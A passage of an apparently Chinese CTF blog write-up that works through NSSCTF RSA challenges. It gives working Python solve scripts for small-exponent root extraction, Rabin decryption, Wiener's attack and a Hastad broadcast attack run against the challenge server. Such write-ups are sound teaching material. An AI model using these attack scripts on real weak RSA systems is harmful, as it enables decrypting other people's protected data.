class="hljs-number">79418540691422578656139651796213224829563266521211325595707569487401417030874358531413674275017334363641194166574500833916574827523075402219754470871728896772312056257743844227927800121160288525434484105786180547178403828613331285574461293211150728313415280329153597549251599876668080073528625299164784405291297754331374420687599875173508778209038236713812747215157059659564867241144529476211694011692007565732793105429228730285249025627762831080251661835294067942958070742202862164086250986988784472568266652325462247009294865764533077164470382743735937483173523682749295196383707694876943634298051820105410771024861599560176707940488888601355473498847493259474613261665538825299531665650233837474894442826242097663456648233384047622152817959729025415665280499618951478005159820575701483220155180955748454167435711033379910310483689839303198822665341421591234243891877857520663120183063591818656508336831518527692847950877186870610083654117153248336928856886934232488927132245720058243202637258025864487122393335118118013444397135476780564523166548571927547341556616683070253790368891423731046742936358877118104790084195711730135202600692806999992373490439385845158780392894927697171401722699273071306493916233696254958735540772870249139252741670476667099529502282392011715616110876451102234600267482991583515122052976378641894214562203326290939184469206074418127906704847146567350085797480500249400491003993809769407575997740985283755035509654310797061339563655229926356893455738361409861102662109994984398860070584568014471082484198504331014073023689622378943694856212172718725529473812336321642429261822836311084518735006587545920946664595488768239633950124822001162595168106106356115962424210028401369438479550293237915944302351566624339603616714683958384871326105542659559877758488581425288668613061792514360263277530824203967659102107889148367539858141289229124274098921748855341045565232484417195620758495861456624842263649414501657786484816662971421962216348340311859717286253287173293151613310383128702607971580042308515018120559903265609733911340589091613087560931098833849573462572181625894166772788435459280323623477689159384354671220634694792005231505741029567734616435905915192606539962414882105254409847885996949466940350184140166614950171110955365828033747003120697209120916652982201967537088553504504252785632280900095976870510754563400828951684036526240669112248351928072177486091157562600003336544767896806392523395037345770580482363058065676920013089896399387769312374871419827762872050800055872960573607645266626972865053489632548224840580503746879607167797904430560935476705014800973841917939689270919224595772574781478285359220463175042728750523639669204218676238297875644055563803457896409252533724486937378974745777400567080239687055154021761534918106133195512030935957251049812753269173090858930245212145938555697547499155977225759702066548720079477737104010668116693232798415289735481194922014811945312893853446826780868861295203942063380964100360870361328125</span><br><br><br>a, b = gmpy2.iroot(c, <span class="hljs-number">97</span>)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><br></code></pre></td></tr></table></figure><p>也能用 <strong>[RSA2]P2</strong>的方法，可以得到k是等于0的，也验证了$ m^{e}= c$,也就是在取模的过程中没有丢失任何信息，我们可以直接开方从而获得m</p><h2 id="rsa22低加密指数攻击">[RSA2]2(低加密指数攻击)</h2><h3 id="main-1">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br><br>n = p*q<br>e = <span class="hljs-number">3</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>m = bytes_to_long(flag)<br><br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 111573371787314339229652810703380127177507745009618224416171957526984270337589283887959174610818933914845556276472159360153787395638087723501889651641965684241070152541291185349571453536221312112508437223801640552330390095266644485311958102687735113533739324296417077804219395793942670324182191309872918900717</span><br><span class="hljs-string">e = 3</span><br><span class="hljs-string">c = 90782646242308381145716338972639920044710403094882163620436540965475107006005657722222634294458956650085252212452241377251397323707019480880284004845674260662647720809672266571040936376737882878688872281858048646517100139303896804340224961592424635124272549514473232731744884837572128596217771005209683966262</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-1">exp</h3><ul class="task-list"><li><label><input type="checkbox"checked="" /><strong>低加密指数攻击</strong></label></li></ul><p>yafu和<ahref="http://factordb.com/">factordb.com</a>都没分解成功，<strong>这里的n也不大，怎么就没成功呢🙄</strong></p><p>那只能看看原理了</p><p>直接使用上题的方式开方并不行，则说明$ m^{e}&gt; c$，不能直接开方。</p><p>我们考虑原理： <span class="math display">\[c \equiv m^{e} (mod\quad n)\]</span> 消去取模，有： <span class="math display">\[m^{e} = c + k\cdot n\]</span> 因为本题中加密指数e很小，我们可以考虑<spanclass="math inline">\(m^{e}\)</span>的值并不是特别大，则我们可以通过遍历<code>k</code>的方式将取模后丢失的信息找回来，</p><p>遍历到何时停止呢？当<span class="math inline">\(c + k\cdotn\)</span>是一个完全e次方数时，则说明我们得到了正确的答案，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">111573371787314339229652810703380127177507745009618224416171957526984270337589283887959174610818933914845556276472159360153787395638087723501889651641965684241070152541291185349571453536221312112508437223801640552330390095266644485311958102687735113533739324296417077804219395793942670324182191309872918900717</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">90782646242308381145716338972639920044710403094882163620436540965475107006005657722222634294458956650085252212452241377251397323707019480880284004845674260662647720809672266571040936376737882878688872281858048646517100139303896804340224961592424635124272549514473232731744884837572128596217771005209683966262</span><br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>):<br>    cc = c + k*n<br>    res = iroot(cc, e)<br>    <span class="hljs-keyword">if</span> res[<span class="hljs-number">1</span>]:             <span class="hljs-comment">#如果第二个参数返回的是true，则m等于第一个参数</span><br>        m = res[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;k:&#x27;</span>,k)                <span class="hljs-comment"># k=11</span><br></code></pre></td></tr></table></figure><h2 id="rsa23rabin">[RSA2]3(Rabin)</h2><h3 id="main-2">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br><br><span class="hljs-keyword">assert</span> p%<span class="hljs-number">4</span> == <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> q%<span class="hljs-number">4</span> == <span class="hljs-number">3</span><br><br>n = p*q<br>e = <span class="hljs-number">2</span><br>m = bytes_to_long(flag)<br><br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;p = <span class="hljs-subst">&#123;p&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;q = <span class="hljs-subst">&#123;q&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p = 67711062621608175960173275013534737889372437946924512522469843485353704013203</span><br><span class="hljs-string">q = 91200252033239924238625443698357031288749612243099728355449192607988117291739</span><br><span class="hljs-string">e = 2</span><br><span class="hljs-string">c = 5251890478898826530186837207902117236305266861227697352434308106457554098811792713226801824100629792962861125855696719512180887415808454466978721678349614</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-2">exp</h3><ul class="task-list"><li><label><input type="checkbox" checked="" /><strong>RSA衍生算法——Rabin算法</strong></label></li></ul><blockquote><p><ahref="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_e_attack/#rsa-rabin">公钥指数相关攻击- CTF Wiki (ctf-wiki.org)</a></p><p>Rabin 算法的特征在于 <span class="math inline">\(e=2\)</span>。</p></blockquote><p>和上题一样，本题e非常小，有<spanclass="math inline">\(e=2\)</span>，但我们会发现c不是一个完全平方数，则说明不能用低加密指数攻击的方法解决。</p><p>同时我们也发现本题e和phi不互素，他们都是偶数，所以我们也得不到RSA的私钥。实际上，除了RSA算法外，还有很多的非对称加密方案，例如在本题中实际上使用了Rabin算法进行加密，只是它类似于RSA，故在CTF中我们将其划分到RSA攻击范畴中，在后续学习中我们还会遇到很对实际并不是RSA但类似RSA的加密算法。</p><p><strong>1.加密</strong></p><ol type="1"><li>取两个大素数p，q，满足<span class="math inline">\(p≡q≡3\ mod\4\)</span>，即这两个素数形式为4k+3，计算<spanclass="math inline">\(n=pq\)</span></li><li><span class="math inline">\(C=m^2\ mod\ n\)</span></li><li>n作公钥，p，q作私钥</li></ol><p><strong>2.解密</strong></p><p>求m，<span class="math inline">\(m^2≡c(mod\ n)\)</span></p><p><a href="https://www.ruanx.net/rsa-solutions/">CTF RSA题解集(ruanx.net)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Xenny的轮子</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>p = <span class="hljs-number">67711062621608175960173275013534737889372437946924512522469843485353704013203</span><br>q = <span class="hljs-number">91200252033239924238625443698357031288749612243099728355449192607988117291739</span><br>e = <span class="hljs-number">2</span><br>c = <span class="hljs-number">5251890478898826530186837207902117236305266861227697352434308106457554098811792713226801824100629792962861125855696719512180887415808454466978721678349614</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rabin_attack</span>(<span class="hljs-params">c, n, p, q</span>):<br>    c1 = powmod(c, (p+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, p)<br>    c2 = powmod(c, (q+<span class="hljs-number">1</span>)//<span class="hljs-number">4</span>, q)<br>    cp1 = p - c1<br>    cp2 = q - c2<br><br>    t1 = invert(p, q)<br>    t2 = invert(q, p)<br><br>    m1 = (q*c1*t2 + p*c2*t1) % n<br>    m2 = (q*c1*t2 + p*cp2*t1) % n<br>    m3 = (q*cp1*t2 + p*c2*t1) % n<br>    m4 = (q*cp1*t2 + p*cp2*t1) % n<br><br>    <span class="hljs-keyword">return</span> m1, m2, m3, m4<br><br>ms = rabin_attack(c, p*q, p, q)<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> ms:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))    <span class="hljs-comment"># 四个只有一个是</span><br></code></pre></td></tr></table></figure><h2 id="rsa24wiener">[RSA2]4(Wiener)</h2><h3 id="main-3">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span><br><br>p = getPrime(<span class="hljs-number">256</span>)<br>q = getPrime(<span class="hljs-number">256</span>)<br><br>n = p*q<br>d = getPrime(<span class="hljs-number">128</span>)<br>e = inverse(d, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = bytes_to_long(flag)<br><br>c = powmod(m, e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 6969872410035233098344189258766624225446081814953480897731644163180991292913719910322241873463164232700368119465476508174863062276659958418657253738005689</span><br><span class="hljs-string">e = 3331016607237504021038095412236348385663413736904453330557803644384818257225138777641344877202234881627514102078530507171735156112302207979925588113589669</span><br><span class="hljs-string">c = 1754994938947260364311041300467524420957926989584983693004487724099773647229373820465164193428679197813476633649362998772470084452129370353136199193923837</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp1">exp1</h3><ul class="task-list"><li><label><inputtype="checkbox" /><strong>Wiener攻击</strong></label></li></ul><p><strong>已知（e，n，c），求m。d很小且e很大，可知是低解密指数攻击（Wiener攻击）。</strong></p><p><strong>这里相当于是反过来了，先生成了d，再由d去求e</strong>，当我们发现<strong>e很大或者说很接近n</strong>时，便可以考虑使用连分数展开的方式，遍历每一个系数，测试是否是解题中需要用到的关键因子，</p><p><ahref="https://blog.csdn.net/XiongSiqi_blog/article/details/130515028">RSA--维纳攻击--代码和题目分析_维纳攻击脚本_Emmaaaaaaaaaa的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 直接用xenny的轮子</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="hljs-keyword">import</span> wiener<br><span class="hljs-comment"># e很大 wiener攻击</span><br>n = <span class="hljs-number">6969872410035233098344189258766624225446081814953480897731644163180991292913719910322241873463164232700368119465476508174863062276659958418657253738005689</span><br>e = <span class="hljs-number">3331016607237504021038095412236348385663413736904453330557803644384818257225138777641344877202234881627514102078530507171735156112302207979925588113589669</span><br>c = <span class="hljs-number">1754994938947260364311041300467524420957926989584983693004487724099773647229373820465164193428679197813476633649362998772470084452129370353136199193923837</span><br> <br>d, p, q = wiener.attack(n, e)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = libnum.n2s(<span class="hljs-built_in">int</span>(m))<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># print(long_to_bytes(m))</span><br></code></pre></td></tr></table></figure><h3 id="exp2">exp2</h3><ul class="task-list"><li><label><input type="checkbox" />用原理写的，还没理解</label></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">6969872410035233098344189258766624225446081814953480897731644163180991292913719910322241873463164232700368119465476508174863062276659958418657253738005689</span><br>e = <span class="hljs-number">3331016607237504021038095412236348385663413736904453330557803644384818257225138777641344877202234881627514102078530507171735156112302207979925588113589669</span><br>c = <span class="hljs-number">1754994938947260364311041300467524420957926989584983693004487724099773647229373820465164193428679197813476633649362998772470084452129370353136199193923837</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ContinuedFraction</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, numerator, denumerator</span>):<br>        self.numberlist = []  <span class="hljs-comment"># number in continued fraction</span><br>        self.fractionlist = []  <span class="hljs-comment"># the near fraction list</span><br>        self.GenerateNumberList(numerator, denumerator)<br>        self.GenerateFractionList()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateNumberList</span>(<span class="hljs-params">self, numerator, denumerator</span>):<br>        <span class="hljs-keyword">while</span> numerator != <span class="hljs-number">1</span>:<br>            quotient = numerator // denumerator<br>            remainder = numerator % denumerator<br>            self.numberlist.append(quotient)<br>            numerator = denumerator<br>            denumerator = remainder<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GenerateFractionList</span>(<span class="hljs-params">self</span>):<br>        self.fractionlist.append([self.numberlist[<span class="hljs-number">0</span>], <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(self.numberlist)):<br>            numerator = self.numberlist[i]<br>            denumerator = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>                temp = numerator<br>                numerator = denumerator + numerator * self.numberlist[i - j - <span class="hljs-number">1</span>]<br>                denumerator = temp<br>            self.fractionlist.append([numerator, denumerator])<br><br><br>a = ContinuedFraction(e, n)<br><span class="hljs-keyword">for</span> k, d <span class="hljs-keyword">in</span> a.fractionlist:<br>    m = powmod(c, d, n)<br>    flag = long_to_bytes(m)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NSSCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="rsa25低加密指数广播攻击">[RSA2]5(低加密指数广播攻击)</h2><h3 id="main-4">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>flag = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<br>m = bytes_to_long(flag.encode())<br>e = <span class="hljs-number">127</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>():<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n: <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c: <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        opt = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;input&gt; &#x27;</span>))<br>        <span class="hljs-keyword">if</span> opt == <span class="hljs-number">1</span>:<br>            enc()<br><br>main()<br></code></pre></td></tr></table></figure><h3 id="exp-3">exp</h3><p>1、低加密指数</p><p>​所谓<strong>低加密指数</strong>，指的是RSA加密过程中使用的参数e的值很小，这样往往会产生安全隐患，导致低加密指数攻击的发生。</p><p>2、广播、</p><p>​所谓<strong>广播</strong>，就是发送方将一份明文进行多份加密，但是每份使用不同的密钥，即密钥中的模数n不同，但是指数e相同且很小，因此我们只要得到多份密文和对应的模数n就可以利用中国剩余定理进行解密。</p><p>3、低加密指数广播攻击</p><p> 实现<strong>低加密指数广播攻击</strong>需要满足以下三个条件：</p><p>（1）加密指数e非常小。</p><p>（2）同一份明文使用不同的模数n，相同的加密指数e进行多次加密。</p><p>（3）攻击者可以得到每一份加密后的密文和对应的模数n、加密指数e。</p><hr /><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202310271642498.png"alt="image-20231027164245430" /><figcaption aria-hidden="true">image-20231027164245430</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Xenny师傅wp，还在学，主要这个是交互的</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crt</span>(<span class="hljs-params">n_list, c_list</span>):  <span class="hljs-comment">#中国剩余定理（CRT）</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>        n *= i<br>    N = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n_list:<br>        N.append(n // i)  <span class="hljs-comment">#计算每个模数对应的 N 值，即将总乘积除以当前模数。</span><br>    t = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n_list)):<br>        t.append(invert(N[i], n_list[i]))   <span class="hljs-comment">#使用invert函数计算每个模数对应的模反元素，并将其添加到列表 t 中。</span><br><br>    summary = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(n_list)):<br>        <span class="hljs-comment">#使用CRT的公式计算解密结果，遍历每个模数，将其密文与相应的权重相乘，然后取模，最后累加到 summary 中。</span><br>        summary = (summary + c_list[i] * t[i] * N[i]) % n<br>    <span class="hljs-keyword">return</span> summary<br><br><br>io = remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28522</span>)<br>e = <span class="hljs-number">127</span><br>n_list = []<br>c_list = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;input&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)  <span class="hljs-comment"># 等待收到input&gt; 后发送1</span><br>    n = <span class="hljs-built_in">int</span>(io.recvline().decode()[<span class="hljs-number">2</span>:])  <span class="hljs-comment"># 接收一行数据 即 n: xxxx</span><br>    c = <span class="hljs-built_in">int</span>(io.recvline().decode()[<span class="hljs-number">2</span>:])  <span class="hljs-comment"># 接收一行数据 即 c: xxxx</span><br>    n_list.append(n)<br>    c_list.append(c)<br><br>M = crt(n_list, c_list)<br>m = iroot(M, e)[<span class="hljs-number">0</span>]<br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><blockquote><p>你是真的难啊，我的哥埃，配置b WSL 2环境给我折腾废了</p><p>其实就是你安装好之后直接去 pycharm里面操作就可以了，有没有的包就安装，安装不成就换源</p><p>比如我安的时候第一次就失败了，然后换源解决：<code>pip install -i https://pypi.doubanio.com/simple/ pycryptodome</code></p><p>注意：</p><p>在 Linux（如你当前的 Bash 终端）中，路径分隔符是斜杠 <code>/</code>而不是反斜杠 <code>\</code>。如果你想切换到<code>D:\code\python\python3.8\Xenny_RSA2\[RSA2]P5</code>目录，你需要使用正斜杠，并且可能需要对特殊字符进行转义。</p><p>尝试使用以下命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/mnt/</span>d<span class="hljs-regexp">/code/</span>python<span class="hljs-regexp">/python3.8/</span>Xenny_RSA2/[RSA2]P5<br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311142341052.png"alt="image-20231114234103995" /><figcaption aria-hidden="true">image-20231114234103995</figcaption></figure></blockquote><h2 id="rsa26p-1光滑">[RSA2]6(p-1光滑)</h2><h3 id="main-5">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 